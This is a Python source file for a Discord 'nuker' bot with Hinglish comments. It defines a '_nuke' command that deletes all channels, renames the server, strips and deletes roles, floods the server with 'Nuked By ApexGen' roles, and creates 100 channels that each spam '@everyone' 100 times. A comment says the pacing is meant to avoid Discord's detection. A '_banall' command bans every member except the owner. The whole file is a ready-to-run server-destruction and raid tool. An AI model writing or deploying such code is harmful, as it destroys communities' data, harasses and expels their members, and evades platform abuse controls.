import asyncio
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="_", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")

@bot.command(name="nuke")
async def nuke(ctx):
    guild = ctx.guild
    
    # 1. Sabhi purane channels ko delete karna (parallel tasks me taaki fast ho)
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)
    
    # 2. Server ki info change karna
    try:
        await guild.edit(name="Now Apex Gen Owns This Server")
    except Exception as e:
        print(f"Error changing server name: {e}")

    # 3. Sabhi members se roles strip karna (except bot and owner)
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            try:
                # Member ke paas jitne roles hain unhe ek saath remove karna
                roles_to_remove = [r for r in member.roles if r != guild.default_role]
                if roles_to_remove:
                    await member.remove_roles(*roles_to_remove, reason="Nuked")
            except Exception:
                pass

    # 4. Purane roles delete karna aur naye 50+ roles create karna
    for role in guild.roles:
        if role != guild.default_role and role < guild.me.top_role:
            try:
                await role.delete()
            except Exception:
                pass

    # Naye roles create karna (Nuked By ApexGen)
    for i in range(1, 56):
        try:
            await guild.create_role(name="Nuked By ApexGen")
        except Exception:
            pass

    # 5. 100 naye channels create karna aur sath me spam start karna
    async def create_and_spam(channel_idx):
        try:
            # Rate limits aur Discord detection se bachne ke liye thoda controlled gap rakha hai
            channel = await guild.create_text_channel(f"Nuked By Ur Daddy")
            await asyncio.sleep(0.3)
            
            # Har channel me 100 baar spam message bhejna
            for _ in range(100):
                await channel.send("@everyone Nuked By ApexGen")
                await asyncio.sleep(0.05) # Speed control taaki fast spam ho
        except Exception:
            pass

    # 100 channels ek sath/background me run karna
    tasks = [create_and_spam(i) for i in range(1, 101)]
    await asyncio.gather(*tasks, return_exceptions=True)


@bot.command(name="banall")
async def banall(ctx):
    guild = ctx.guild
    # Server ke sabhi members aur bots ko ban karna (Owner aur Bot khud ko chhod kar)
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            try:
                await guild.ban(member, reason="Server Nuked By ApexGen")
                await asyncio.sleep(0.1) # Rate limit se bachne ke liye chhota delay
            except Exception:
                pass

bot.run("YOUR_BOT_TOKEN_HERE")
